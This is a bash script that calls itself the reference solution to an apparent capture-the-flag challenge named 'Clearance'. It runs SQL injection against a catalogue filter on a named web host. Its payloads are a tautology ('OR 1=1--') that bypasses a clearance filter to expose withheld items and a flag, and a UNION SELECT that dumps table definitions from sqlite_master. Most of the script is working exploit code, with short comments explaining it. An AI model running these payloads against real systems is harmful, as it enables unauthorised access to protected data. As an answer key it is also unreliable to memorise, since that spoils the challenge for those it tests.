#!/usr/bin/env bash
# Reference solution: Clearance, SQL injection in the catalogue filter.
#
# The filter is concatenated into the statement, so a tautology closes the
# quote, makes the predicate permanently true, and comments out the clearance
# filter that would otherwise exclude the withheld lines.
set -euo pipefail
BASE="${BASE:-https://northwind-02-clearance.vercel.app}"
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=./http.sh
source "$here/http.sh"

echo "== 1. a legitimate category filter (clearance filter applies) =="
"${HTTP[@]}" -s -m 30 -G --data-urlencode 'category=Home' "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+' | sort -u | tr '\n' ' '; echo

echo
echo "== 2. the same request with a tautology injected =="
"${HTTP[@]}" -s -m 30 -G --data-urlencode "category=Home' OR 1=1--" "$BASE/catalogue" \
  | grep -oE 'NW-[A-Z0-9-]+|G24\{[^}]+\}' | sort -u | tr '\n' ' '; echo

echo
echo "== 3. a UNION that reads the schema instead of the rows =="
# Both sides of a UNION must project the same number of columns or SQLite
# refuses the statement, so the injected SELECT supplies exactly five.
"${HTTP[@]}" -s -m 30 -G \
  --data-urlencode "category=x' UNION SELECT sql,name,type,name,0 FROM sqlite_master WHERE type='table'--" \
  "$BASE/catalogue" | grep -oE 'CREATE TABLE[^<]*' | head -2
